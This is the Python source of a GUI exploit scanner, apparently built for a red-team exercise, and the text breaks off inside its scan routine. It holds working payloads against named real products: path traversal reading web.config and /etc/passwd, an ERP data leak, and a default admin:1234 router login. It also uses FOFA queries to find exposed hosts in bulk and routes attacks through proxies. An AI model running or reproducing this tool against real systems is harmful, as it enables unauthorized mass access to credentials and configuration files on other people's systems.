import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
from urllib.parse import urlparse, urlencode
import webbrowser
import time
import pyperclip
import os
import json
import re
import base64
import uuid
import sys
import binascii
from datetime import datetime
import socks
import socket
from requests.auth import HTTPBasicAuth

# 确保pyperclip在Linux环境下也能工作
try:
    import pyperclip
except ImportError:
    pyperclip = None


# ================== POC核心引擎 ==================
class POCEngine:
    def __init__(self):
        self.poc_db = {
            "kefu_list_exploit": {
                "name": "票友ERP系统kefu_list信息泄露",
                "method": "GET",
                "endpoint": "/json_db/kefu_list.aspx",
                "params": {
                    'stype': '0',
                    '_search': 'false',
                    'nd': '1751246532981',
                    'rows': '100',
                    'page': '1',
                    'sidx': 'id',
                    'sord': 'asc'
                },
                "headers": {
                    'Host': '',  # 动态填充
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                    'Cookie': 'ASP.NET_SessionId=tpvp1q1gklb3bvymeejgmqxo',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'close'
                },
                "check_vuln": self._check_kefu_vuln,
                "fofa_query": '(body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"||body="tickets/intCity.css"'
            },
            "WebOne_download_path_traversal": {
                "name": "WebOne劳动力与考勤管理套件DownloadFile.aspx任意文件读取",
                "method": "GET",
                "endpoint": "/webForms/Download/DownloadFile.aspx",
                "params": {
                    'fileid': '/../../web.config',  # 路径遍历Payload
                    'flag': 'report'
                },
                "headers": {
                    'Host': '',  # 动态填充
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'close'
                },
                "check_vuln": self._check_path_traversal_vuln,
                "fofa_query": 'title="Webone-WTS" && body="background"'
            },
            "csv_download_traversal": {
                "name": "Unibox路由器任意文件读取",
                "method": "GET",
                "endpoint": "/tools/download_csv.php",
                "params": {
                    'download_file': '../../../etc/passwd'  # 路径遍历Payload
                },
                "headers": {
                    'Host': '',  # 动态填充
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'close'
                },
                "check_vuln": self._check_Unibox_traversal_vuln,
                "fofa_query": 'body="www.wifi-soft.com"'
            },
            "luci_admin_weak_pass": {
                "name": "ZyXEL-EMG3425-Q10A存在弱口令漏洞",  # 修复：将"极"改为"name"
                "method": "POST",
                "endpoint": "/cgi-bin/luci/expert/configuration",
                "data": {
                    'language_choice': 'zh',
                    'username': 'admin',
                    'password': '1234',
                    'time_choice': 'GMT%2B12'  # 保持原始编码
                },
                "headers": {
                    'Host': '',  # 动态填充
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'close',
                    'Cache-Control': 'max-age=0',
                    'Origin': '',  # 动态填充
                    'Referer': '',  # 动态填充
                    'Upgrade-Insecure-Requests': '1'
                },
                "check_vuln": self._check_ZyXEL_weak_pass,
                "fofa_query": 'body="ZyXEL-EMG3425-Q10A" || title="ZyXEL EMG3425-Q10A"'  # 示例指纹
            },
        }
        self.session = requests.Session()
        self.session.verify = False  # 忽略SSL证书

        # FOFA配置
        self.fofa_config = {
            "email": "",
            "api_key": "",
            "size": 100
        }

        # 代理配置
        self.proxy_config = {
            "type": "None",  # None, HTTP, Socks5
            "host": "",
            "port": "",
            "user": "",
            "password": ""
        }

        # 保存原始socket实现
        self.original_socket = socket.socket

        # 加载配置文件
        self.load_config()

        # 初始化代理设置
        self.update_session_proxy()

    def load_config(self):
        """ 加载配置文件 """
        config_path = "scanner_config.json"
        if os.path.exists(config_path):
            try:
                with open(config_path, "r", encoding="utf-8") as f:
                    config = json.load(f)
                    self.fofa_config = config.get("fofa_config", self.fofa_config)
                    self.proxy_config = config.get("proxy_config", self.proxy_config)
            except:
                pass

    def save_config(self):
        """ 保存配置文件 """
        config = {
            "fofa_config": self.fofa_config,
            "proxy_config": self.proxy_config
        }
        with open("scanner_config.json", "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)

    def update_session_proxy(self):
        """ 更新会话的代理设置 """
        # 重置代理
        self.session.proxies.clear()
        socket.socket = self.original_socket

        # 根据配置设置代理
        proxy_type = self.proxy_config.get("type", "None")
        host = self.proxy_config.get("host", "").strip()
        port = self.proxy_config.get("port", "").strip()
        user = self.proxy_config.get("user", "").strip()
        password = self.proxy_config.get("password", "").strip()

        if proxy_type != "None" and host and port:
            try:
                # 构建代理URL
                if user or password:
                    proxy_url = f"{user}:{password}@{host}:{port}"
                else:
                    proxy_url = f"{host}:{port}"

                # 设置SOCKS5代理
                if proxy_type == "Socks5":
                    socks.set_default_proxy(
                        socks.SOCKS5,
                        host,
                        int(port),
                        True,  # 解析远程DNS
                        username=user,
                        password=password
                    )
                    socket.socket = socks.socksocket
                    # 清除requests的代理设置
                    self.session.proxies = {}
                else:  # HTTP代理
                    self.session.proxies = {
                        "http": f"http://{proxy_url}",
                        "https": f"http://{proxy_url}"  # 大多数情况下HTTPS也走HTTP代理
                    }

                return True
            except Exception as e:
                print(f"设置代理失败: {str(e)}")
                return False
        else:
            # 无代理时重置设置
            self.session.proxies = {}
            return True

    def _check_kefu_vuln(self, response):
        """ 客服系统漏洞检测逻辑 """
        if response.status_code == 200:
            if "total" in response.text and "username" in response.text:
                # 提取关键数据验证漏洞存在性
                return True, "存在敏感数据泄露！", response.request.url, response
        return False, "未检测到漏洞特征", "", None

    def _check_path_traversal_vuln(self, response):
        """ 文件下载路径遍历漏洞检测逻辑 """
        if response.status_code == 200:
            # 检测web.config特征内容
            if 'xml' in response.text:
                return True, "检测到文件泄露！", response.request.url, response
            # 检测敏感信息泄露特征
        elif response.status_code == 500 and 'Configuration Error' in response.text:
            return True, "服务器配置错误信息泄露", response.request.url, response
        return False, "未检测到敏感文件泄露特征", "", None

    def _check_Unibox_traversal_vuln(self, response):
        """ Unibox路由器任意文件读取漏洞检测逻辑 """
        if response.status_code == 200:
            # 检测响应内容是否为/etc/passwd格式
            if 'root' in response.text:
                return True, "检测到系统敏感文件泄露！", response.request.url, response

            # 检测异常响应长度（正常CSV文件通常较小）
            if len(response.text) > 500 and "DOCTYPE" not in response.text:
                return True, "异常响应长度，疑似文件泄露", response.request.url, response

        # 检测错误信息泄露
        elif response.status_code == 500 and ("Permission denied" in response.text or
                                              "No such file" in response.text):
            return True, "服务器路径遍历错误信息泄露", response.request.url, response

        return False, "未检测到敏感文件泄露特征", "", None

    def _check_ZyXEL_weak_pass(self, response):
        """ 检测ZyXEL-EMG3425-Q10A存在弱口令漏洞 """
        # 检测200响应中的登录成功特征
        if response.status_code == 200:
            return True, "admin:1234弱口令存在，进入管理页面", response.request.url, response

        # 检测登录失败特征
        if response.status_code == 302:
            return False, "弱口令不存在", "", None

        return False, "未知响应状态，需要手动验证", "", None

    def scan_target(self, target, poc_id):
        """ 执行单个POC扫描 """
        poc = self.poc_db.get(poc_id)
        if not poc:
            return False, "POC不存在", "", None, "", None

        try:
            # 动态更新Host、Origin和Referer
            headers = poc["headers"].copy()
            parsed_url = urlparse(target)
            host = parsed_url.netloc
            base_url = f"{parsed_url.scheme}://{host}"

            headers["Host"] = host
            headers["Origin"] = base_url
            headers["Referer"] = f"{base_url}"

            # 构建完整URL
            url = f"{target.rstrip('/')}{poc['endpoint']}"

            # 构建原始HTTP请求包 (Burp Suite兼容格式)
            raw_request = self._build_burp_request(poc, url, headers)

            # 发送请求
            if poc["method"] == "POST":
                response = self.session.request(
                    method=poc["method"],
                    url=url,
                    data=poc.get("data", {}),
                    headers=headers,
                    timeout=10,
                    allow_redirects=False  # 禁止自动重定向
                )
            else:
                response = self.session.request(
                    method=poc["method"],
                    url=url,  # 修复：url=url 而不是 url极=url
                    params=poc.get("params", {}),
                    headers=headers,
                    timeout=10,
                    allow_redirects=False  # 禁止自动重定向
                )

            # 构建原始响应包
            raw_response = self._build_raw_response(response)

            is_vuln, detail, exploit_url, _ = poc["check_vuln"](response)
            return is_vuln, detail, raw_request, raw_response, exploit_url, response
        except Exception as e:
            return False, f"请求失败: {str(e)}", "", "", "", None

    def _build_burp_request(self, poc, url, headers):
        """ 构建Burp Suite兼容的完整HTTP请求包 """
        # 请求行
        if poc["method"] == "GET":
            if poc.get("params"):
                query_string = urlencode(poc["params"], doseq=True)
                url_with_params = f"{url}?{query_string}"
                request_line = f"{poc['method']} {url_with_params} HTTP/1.1\r\n"
            else:
                request_line = f"{poc['method']} {url} HTTP/1.1\r\n"
        else:
            request_line = f"{poc['method']} {url} HTTP/1.1\r\n"

        # 请求头
        headers_str = ""
        for key, value in headers.items():
            if value:  # 只显示非空值
                headers_str += f"{key}: {value}\r\n"

        # POST数据
        body = ""
        if poc["method"] == "POST" and poc.get("data"):
            # 特殊处理：如果是表单数据，转换为application/x-www-form-urlencoded格式
            if "Content-Type" in headers and "application/x-www-form-urlencoded" in headers["Content-Type"]:
                body = urlencode(poc["data"])
            else:
                body = poc["data"]

        # 完整请求数据包
        return f"{request_line}{headers_str}\r\n{body}"

    def _build_raw_response(self, response):
        """ 构建完整的HTTP响应数据包 """
        # 响应状态行
        status_line = f"HTTP/1.1 {response.status_code} {response.reason}\r\n"

        # 响应头
        headers = ""
        for key, value in response.headers.items():
            headers += f"{key}: {value}\r\n"

        # 响应体
        body = ""
        try:
            # 检查是否为文本内容
            content_type = response.headers.get('Content-Type', '').lower()
            if 'text' in content_type or 'xml' in content_type or 'html' in content_type or 'json' in content_type:
                body = response.text
            else:
                # 二进制内容转换为十六进制字符串
                hex_data = binascii.hexlify(response.content).decode('ascii')
                # 格式化十六进制：每行16字节
                formatted_hex = ""
                for i in range(0, len(hex_data), 32):
                    formatted_hex += hex_data[i:i + 32] + "\n"
                body = f"<Binary Content ({len(response.content)} bytes)>\n{formatted_hex}"
        except Exception as e:
            body = f"无法解析响应体: {str(e)}"

        # 完整响应数据包
        return f"{status_line}{headers}\r\n{body}"

    def fofa_search(self, query):
        """ 执行FOFA搜索 """
        if not self.fofa_config.get("email") or not self.fofa_config.get("api_key"):
            return [], "请先配置FOFA API密钥"

        base_url = "https://fofa.info/api/v1/search/all"
        params = {
            "qbase64": base64.b64encode(query.encode()).decode(),
            "email": self.fofa_config["email"],
            "key": self.fofa_config["api_key"],
            "size": self.fofa_config.get("size", 100),
            "fields": "host,ip,port,country,city,server"
        }

        try:
            # 临时会话用于FOFA搜索（不继承主会话代理）
            temp_session = requests.Session()
            response = temp_session.get(base_url, params=params, timeout=20)
            if response.status_code != 200:
                return [], f"FOFA API请求失败: {response.status_code}"

            data = response.json()
            if not data.get("error"):
                # 处理结果
                results = []
                for item in data.get("results", []):
                    host = item[0]
                    # 确保host以http或https开头
                    if not host.startswith("http"):
                        host = f"http://{host}"
                    results.append({
                        "url": host,
                        "ip": item[1],
                        "port": item[2],
                        "country": item[3],
                        "city": item[4],
                        "server": item[5]
                    })
                return results, f"成功获取 {len(results)} 条结果"
            else:
                return [], f"FOFA API错误: {data.get('errmsg')}"
        except Exception as e:
            return [], f"FOFA搜索失败: {str(e)}"


# ================== 图形化界面 ==================
class POCScannerGUI:
    def __init__(self, master):
        self.master = master
        master.title("2025HW POC Scanner v4.0 By 长安风生")
        master.geometry("1850x850")  # 增加高度以容纳日志区域

        # 初始化引擎
        self.engine = POCEngine()
        self.is_scanning = False
        self.stop_requested = False

        # 存储漏洞利用信息的字典
        self.vuln_details = {}

        # 日志缓冲区
        self.log_buffer = []
        self.last_log_time = time.time()

        # 界面布局
        self._create_widgets()

        # 配置样式
        self._configure_styles()

        # 启动日志刷新定时器
        self._start_log_refresh()

    def _configure_styles(self):
        """ 配置界面样式 """
        style = ttk.Style()
        style.configure("Treeview", rowheight=25)
        style.map("Treeview", background=[("selected", "#bfdbff")])
        style.configure("Vuln.TButton", foreground="red", font=("Microsoft YaHei", 9, "bold"))
        style.configure("Request.TLabel", font=("Consolas", 10), borderwidth=1, relief="solid", padding=5)
        style.configure("Log.TFrame", background="#1E1E1E")
        style.configure("Log.TText", background="#1E1E1E", foreground="#D4D4D4", font=("Consolas", 9))
        style.configure("Info.Log", foreground="#569CD6")
        style.configure("Success.Log", foreground="#6A9955")
        style.configure("Warning.Log", foreground="#DCDCAA")
        style.configure("Error.Log", foreground="#F44747")
        style.configure("Debug.Log", foreground="#9CDCFE")

    def _start_log_refresh(self):
        """ 启动日志刷新定时器 """
        self.master.after(500, self._refresh_logs)

    def _refresh_logs(self):
        """ 刷新日志显示 """
        if self.log_buffer:
            # 应用标签样式
            for log in self.log_buffer:
                timestamp, level, message = log

                # 添加日志到文本框
                self.log_area.configure(state="normal")
                self.log_area.insert(tk.END, f"[{timestamp}] ", ("Info.Log" if level == "INFO" else "Debug.Log"))
                self.log_area.insert(tk.END, f"[{level}] ", level + ".Log")
                self.log_area.insert(tk.END, message + "\n")
                self.log_area.configure(state="disabled")

                # 滚动到最后
                self.log_area.see(tk.END)

            # 清空缓冲区
            self.log_buffer = []

        # 继续定时刷新
        self.master.after(500, self._refresh_logs)

    def log(self, message, level="INFO"):
        """ 添加日志消息 """
        now = datetime.now().strftime("%H:%M:%S")
        self.log_buffer.append((now, level, message))

        # 如果超过0.5秒没有刷新，强制刷新
        if time.time() - self.last_log_time > 0.5:
            self._refresh_logs()
            self.last_log_time = time.time()

    def _create_widgets(self):
        # 左侧：POC列表 (支持多选)
        self.poc_frame = ttk.LabelFrame(self.master, text="POC列表")
        self.poc_frame.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)

        self.poc_listbox = tk.Listbox(
            self.poc_frame,
            selectmode=tk.MULTIPLE,
            width=45,
            height=20,
            font=("Microsoft YaHei", 9)
        )
        for poc_id in self.engine.poc_db:
            self.poc_listbox.insert(tk.END, self.engine.poc_db[poc_id]["name"])
        self.poc_listbox.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

        # 绑定选择事件
        self.poc_listbox.bind('<<ListboxSelect>>', self._on_poc_select)

        # 中间：目标输入区
        input_frame = ttk.Frame(self.master)
        input_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)

        # 目标输入区
        target_frame = ttk.LabelFrame(input_frame, text="目标输入")
        target_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(target_frame, text="目标URL（每行一个）:").pack(anchor=tk.W)
        self.target_input = scrolledtext.ScrolledText(
            target_frame,
            width=40,
            height=5,
            font=("Consolas", 9)
        )
        self.target_input.pack(pady=5, fill=tk.X)

        # =========== 代理配置区域 ===========
        proxy_frame = ttk.LabelFrame(input_frame, text="代理设置")
        proxy_frame.pack(fill=tk.X, pady=5)

        # 代理类型选择
        ttk.Label(proxy_frame, text="代理类型:").grid(row=0, column=0, padx=5, pady=2, sticky=tk.W)
        self.proxy_type = ttk.Combobox(
            proxy_frame,
            values=["None", "HTTP", "Socks5"],
            state="readonly",
            width=8
        )
        self.proxy_type.grid(row=0, column=1, padx=5, pady=2, sticky=tk.W)
        self.proxy_type.set(self.engine.proxy_config.get("type", "None"))
        self.proxy_type.bind("<<ComboboxSelected>>", self._on_proxy_type_change)

        # 代理主机
        ttk.Label(proxy_frame, text="主机:").grid(row=0, column=2, padx=5, pady=2, sticky=tk.W)
        self.proxy_host = ttk.Entry(proxy_frame, width=15)
        self.proxy_host.grid(row=0, column=3, padx=5, pady=2, sticky=tk.W)
        self.proxy_host.insert(0, self.engine.proxy_config.get("host", ""))

        # 代理端口
        ttk.Label(proxy_frame, text="端口:").grid(row=0, column=4, padx=5, pady=2, sticky=tk.W)
        self.proxy_port = ttk.Entry(proxy_frame, width=8)
        self.proxy_port.grid(row=0, column=5, padx=5, pady=2, sticky=tk.W)
        self.proxy_port.insert(0, self.engine.proxy_config.get("port", ""))

        # 代理用户名
        ttk.Label(proxy_frame, text="用户名:").grid(row=1, column=0, padx=5, pady=2, sticky=tk.W)
        self.proxy_user = ttk.Entry(proxy_frame, width=15)
        self.proxy_user.grid(row=1, column=1, padx=5, pady=2, sticky=tk.W)
        self.proxy_user.insert(0, self.engine.proxy_config.get("user", ""))

        # 代理密码
        ttk.Label(proxy_frame, text="密码:").grid(row=1, column=2, padx=5, pady=2, sticky=tk.W)
        self.proxy_password = ttk.Entry(proxy_frame, width=15, show="*")
        self.proxy_password.grid(row=1, column=3, padx=5, pady=2, sticky=tk.W)
        self.proxy_password.insert(0, self.engine.proxy_config.get("password", ""))

        # 代理测试按钮
        self.test_proxy_btn = ttk.Button(
            proxy_frame,
            text="测试代理",
            command=self.test_proxy,
            width=10
        )
        self.test_proxy_btn.grid(row=1, column=4, padx=5, pady=2)

        # 保存配置按钮
        self.save_proxy_btn = ttk.Button(
            proxy_frame,
            text="保存配置",
            command=self.save_proxy_config,
            width=10
        )
        self.save_proxy_btn.grid(row=1, column=5, padx=5, pady=2)

        # FOFA配置区域
        fofa_config_frame = ttk.LabelFrame(input_frame, text="FOFA配置")
        fofa_config_frame.pack(fill=tk.X, pady=5)

        # 配置网格
        ttk.Label(fofa_config_frame, text="邮箱:").grid(row=0, column=0, padx=5, pady=2, sticky=tk.W)
        self.fofa_email = ttk.Entry(fofa_config_frame, width=25)
        self.fofa_email.grid(row=0, column=1, padx=5, pady=2, sticky=tk.W)
        self.fofa_email.insert(0, self.engine.fofa_config.get("email", ""))

        ttk.Label(fofa_config_frame, text="API Key:").grid(row=1, column=0, padx=5, pady=2, sticky=tk.W)
        self.fofa_api_key = ttk.Entry(fofa_config_frame, width=40, show="*")
        self.fofa_api_key.grid(row=1, column=1, padx=5, pady=2, sticky=tk.W)
        self.fofa_api_key.insert(0, self.engine.fofa_config.get("api_key", ""))

        ttk.Label(fofa_config_frame, text="结果数量:").grid(row=2, column=0, padx=5, pady=2, sticky=tk.W)
        self.fofa_size = ttk.Spinbox(fofa_config_frame, from_=1, to=1000, width=8)
        self.fofa_size.grid(row=2, column=1, padx=5, pady=2, sticky=tk.W)
        self.fofa_size.set(self.engine.fofa_config.get("size", 100))

        # 配置保存按钮
        ttk.Button(
            fofa_config_frame,
            text="保存配置",
            command=self.save_fofa_config,
            width=10
        ).grid(row=2, column=2, padx=5, pady=2)

        # FOFA指纹区域
        fofa_frame = ttk.LabelFrame(input_frame, text="FOFA指纹搜索")
        fofa_frame.pack(fill=tk.X, pady=5)

        # FOFA查询输入框
        ttk.Label(fofa_frame, text="FOFA查询语句:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.fofa_query = ttk.Entry(fofa_frame, width=45)
        self.fofa_query.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        # FOFA搜索按钮
        self.fofa_search_btn = ttk.Button(
            fofa_frame,
            text="搜索",
            command=self.do_fofa_search,
            width=10
        )
        self.fofa_search_btn.grid(row=0, column=2, padx=5, pady=5)

        # 添加结果到目标按钮
        self.add_targets_btn = ttk.Button(
            fofa_frame,
            text="添加结果到目标",
            command=self.add_fofa_results,
            state=tk.DISABLED,
            width=15
        )
        self.add_targets_btn.grid(row=0, column=3, padx=5, pady=5)

        # FOFA结果树状视图
        fofa_result_frame = ttk.Frame(fofa_frame)
        fofa_result_frame.grid(row=1, column=0, columnspan=4, sticky=tk.NSEW, padx=5, pady=5)

        # 创建滚动条
        scrollbar = ttk.Scrollbar(fofa_result_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # 创建树状视图
        columns = ("url", "ip", "port", "country", "city", "server")
        self.fofa_tree = ttk.Treeview(
            fofa_result_frame,
            columns=columns,
            show="headings",
            yscrollcommand=scrollbar.set,
            height=5
        )
        scrollbar.config(command=self.fofa_tree.yview)

        # 配置列
        self.fofa_tree.heading("url", text="URL")
        self.fofa_tree.heading("ip", text="IP地址")
        self.fofa_tree.heading("port", text="端口")
        self.fofa_tree.heading("country", text="国家")
        self.fofa_tree.heading("city", text="城市")
        self.fofa_tree.heading("server", text="服务器")

        self.fofa_tree.column("url", width=200, minwidth=150)
        self.fofa_tree.column("ip", width=100, minwidth=80)
        self.fofa_tree.column("port", width=60, minwidth=50)
        self.fofa_tree.column("country", width=80, minwidth=60)
        self.fofa_tree.column("city", width=80, minwidth=60)
        self.fofa_tree.column("server", width=150, minwidth=100)

        self.fofa_tree.pack(fill=tk.BOTH, expand=True)

        # 存储FOFA搜索结果
        self.fofa_results = []

        # 扫描控制按钮
        btn_frame = ttk.Frame(input_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        self.scan_btn = ttk.Button(
            btn_frame,
            text="开始扫描",
            command=self.start_scan,
            width=10
        )
        self.scan_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = ttk.Button(
            btn_frame,
            text="停止扫描",
            state=tk.DISABLED,
            command=self.stop_scan,
            width=10
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # 添加导出结果按钮
        self.export_btn = ttk.Button(
            btn_frame,
            text="导出结果",
            command=self.export_results,
            width=10
        )
        self.export_btn.pack(side=tk.LEFT, padx=5)

        # 清空日志按钮
        self.clear_log_btn = ttk.Button(
            btn_frame,
            text="清空日志",
            command=self.clear_logs,
            width=10
        )
        self.clear_log_btn.pack(side=tk.RIGHT, padx=5)

        # ============== 实时日志区域 ==============
        log_frame = ttk.LabelFrame(input_frame, text="实时日志")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        # 创建日志文本框
        self.log_area = scrolledtext.ScrolledText(
            log_frame,
            wrap=tk.WORD,
            width=100,
            height=12,
            font=("Consolas", 9),
            background="#1E1E1E",
            foreground="#D4D4D4"
        )
        self.log_area.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_area.configure(state="disabled")

        # 配置标签样式
        self.log_area.tag_configure("INFO.Log", foreground="#569CD6")
        self.log_area.tag_configure("SUCCESS.Log", foreground="#6A9955")
        self.log_area.tag_configure("WARNING.Log", foreground="#DCDCAA")
        self.log_area.tag_configure("ERROR.Log", foreground="#F44747")
        self.log_area.tag_configure("DEBUG.Log", foreground="#9CDCFE")

        # 右侧：结果表格
        result_frame = ttk.LabelFrame(self.master, text="扫描结果")
        result_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 创建带滚动条的Treeview
        tree_scroll = ttk.Scrollbar(result_frame)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)

        self.result_tree = ttk.Treeview(
            result_frame,
            columns=("target", "poc", "status", "detail"),
            show="headings",
            yscrollcommand=tree_scroll.set,
            height=25
        )
        tree_scroll.config(command=self.result_tree.yview)

        # 配置列
        self.result_tree.heading("target", text="目标")
        self.result_tree.heading("poc", text="POC名称")
        self.result_tree.heading("status", text="状态")
        self.result_tree.heading("detail", text="详情")

        self.result_tree.column("target", width=200, minwidth=150)
        self.result_tree.column("poc", width=180, minwidth=120)
        self.result_tree.column("status", width=70, minwidth=50)
        self.result_tree.column("detail", width=300, minwidth=200)

        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 为扫描结果树添加标签颜色
        self.result_tree.tag_configure("vulnerable", background="#FFCCCC")
        self.result_tree.tag_configure("safe", background="#CCFFCC")
        self.result_tree.tag_configure("error", background="#FFF3CD")

        # 绑定选择事件
        self.result_tree.bind('<<TreeviewSelect>>', self._on_result_select)

    def _on_proxy_type_change(self, event):
        """ 代理类型改变时更新UI """
        proxy_type = self.proxy_type.get()
        if proxy_type == "None":
            state = tk.DISABLED
        else:
            state = tk.NORMAL

        # 更新相关控件状态
        self.proxy_host.configure(state=state)
        self.proxy_port.configure(state=state)
        self.proxy_user.configure(state=state)
        self.proxy_password.configure(state=state)

    def save_proxy_config(self):
        """ 保存代理配置 """
        self.engine.proxy_config = {
            "type": self.proxy_type.get(),
            "host": self.proxy_host.get().strip(),
            "port": self.proxy_port.get().strip(),
            "user": self.proxy_user.get().strip(),
            "password": self.proxy_password.get().strip()
        }

        # 更新会话代理
        if self.engine.update_session_proxy():
            self.engine.save_config()
            self.log("代理配置已保存并生效")
        else:
            self.log("代理配置保存失败，请检查参数", "ERROR")

    def test_proxy(self):
        """ 测试代理连接 """
        # 保存配置
        self.save_proxy_config()

        self.log("正在测试代理连通性...")

        # 在新线程中测试
        def test_thread():
            try:
                # 测试目标使用互联网标准地址
                test_url = "http://httpbin.org/ip"

                # 创建临时会话（不继承主会话设置）
                test_session = requests.Session()
                test_session.verify = False

                # 应用当前配置的代理设置
                proxy_type = self.engine.proxy_config.get("type", "None")
                host = self.engine.proxy_config.get("host", "").strip()
                port = self.engine.proxy_config.get("port", "").strip()
                user = self.engine.proxy_config.get("user", "").strip()
                password = self.engine.proxy_config.get("password", "").strip()

                if proxy_type != "None" and host and port:
                    try:
                        # 构建代理URL
                        if user or password:
                            proxy_url = f"{user}:{password}@{host}:{port}"
                        else:
                            proxy_url = f"{host}:{port}"

                        # 设置SOCKS5代理
                        if proxy_type == "Socks5":
                            socks.set_default_proxy(
                                socks.SOCKS5,
                                host,
                                int(port),
                                True,  # 解析远程DNS
                                username=user,
                                password=password
                            )
                            socket.socket = socks.socksocket
                            # 清除requests的代理设置
                            test_session.proxies = {}
                        else:  # HTTP代理
                            test_session.proxies = {
                                "http": f"http://{proxy_url}",
                                "https": f"http://{proxy_url}"  # 大多数情况下HTTPS也走HTTP代理
                            }
                    except Exception as e:
                        self.log(f"设置代理失败: {str(e)}", "ERROR")
                        return

                # 发送测试请求
                response = test_session.get(test_url, timeout=10)

                if response.status_code == 200:
                    try:
                        ip_info = response.json().get("origin", "未知")
                        self.log(f"代理测试成功! 返回IP: {ip_info}", "SUCCESS")
                    except:
                        self.log("代理测试成功! 响应内容格式错误", "SUCCESS")
                else:
                    self.log(f"代理测试失败: 状态码 {response.status_code}", "ERROR")

            except Exception as e:
                self.log(f"代理测试失败: {str(e)}", "ERROR")

        threading.Thread(target=test_thread, daemon=True).start()

    def _on_poc_select(self, event):
        """ 当选择POC时显示描述 """
        # 清除当前选择
        self.result_tree.selection_remove(self.result_tree.selection())

        # 获取当前选择的POC
        selected = self.poc_listbox.curselection()
        if selected:
            poc_id = list(self.engine.poc_db.keys())[selected[0]]
            poc_info = self.engine.poc_db[poc_id]

            # 显示POC描述
            self.log(f"已选择: {poc_info['name']} - FOFA指纹: {poc_info['fofa_query']}")

    def save_fofa_config(self):
        """ 保存FOFA配置 """
        self.engine.fofa_config = {
            "email": self.fofa_email.get(),
            "api_key": self.fofa_api_key.get(),
            "size": int(self.fofa_size.get())
        }
        self.engine.save_config()
        self.log("FOFA配置已保存!")

    def do_fofa_search(self):
        """ 执行FOFA搜索 """
        query = self.fofa_query.get().strip()
        if not query:
            messagebox.showwarning("警告", "请输入FOFA查询语句")
            return

        self.log(f"正在执行FOFA搜索: {query}")

        # 禁用搜索按钮
        self.fofa_search_btn.config(state=tk.DISABLED)
        self.add_targets_btn.config(state=tk.DISABLED)

        # 在新线程中执行搜索
        def search_thread():
            try:
                results, message = self.engine.fofa_search(query)
                self.log(message)

                if results:
                    # 清空现有结果
                    self.fofa_tree.delete(*self.fofa_tree.get_children())

                    # 添加新结果
                    for i, result in enumerate(results):
                        self.fofa_tree.insert("", tk.END, values=(
                            result["url"],
                            result["ip"],
                            result["port"],
                            result["country"],
                            result["city"],
                            result["server"]
                        ))

                    # 启用添加按钮
                    self.add_targets_btn.config(state=tk.NORMAL)
                    self.fofa_results = results
                else:
                    self.fofa_results = []

            except Exception as e:
                self.log(f"FOFA搜索失败: {str(e)}", "ERROR")
            finally:
                self.fofa_search_btn.config(state=tk.NORMAL)

        threading.Thread(target=search_thread).start()

    def add_fofa_results(self):
        """ 添加FOFA搜索结果到目标列表 """
        if not self.fofa_results:
            return

        self.target_input.configure(state="normal")

        # 获取所有目标URL
        current_targets = self.target_input.get("1.0", tk.END).splitlines()

        # 添加新的目标URL（过滤重复项）
        added_count = 0
        for result in self.fofa_results:
            url = result["url"].rstrip("/")
            if url and url not in current_targets:
                self.target_input.insert(tk.END, url + "\n")
                added_count += 1

        self.target_input.configure(state="normal")
        self.log(f"成功添加 {added_count} 个FOFA目标到扫描列表")

    def start_scan(self):
        """ 开始扫描 """
        if self.is_scanning:
            messagebox.showinfo("提示", "扫描已在运行中")
            return

        # 获取选中的POC
        selected_poc_indices = self.poc_listbox.curselection()
        if not selected_poc_indices:
            messagebox.showwarning("警告", "请选择至少一个POC")
            return

        selected_pocs = []
        poc_ids = list(self.engine.poc_db.keys())
        for idx in selected_poc_indices:
            selected_pocs.append(poc_ids[idx])

        # 获取扫描目标
        targets = self.target_input.get("1.0", tk.END).splitlines()
        targets = [t.strip() for t in targets if t.strip()]

        if not targets:
            messagebox.showwarning("警告", "请输入至少一个目标URL")
            return

        # 清除之前的结果
        self.result_tree.delete(*self.result_tree.get_children())
        self.log("=" * 50)
        self.log(f"开始扫描 {len(targets)} 个目标, 使用 {len(selected_pocs)} 个POC")
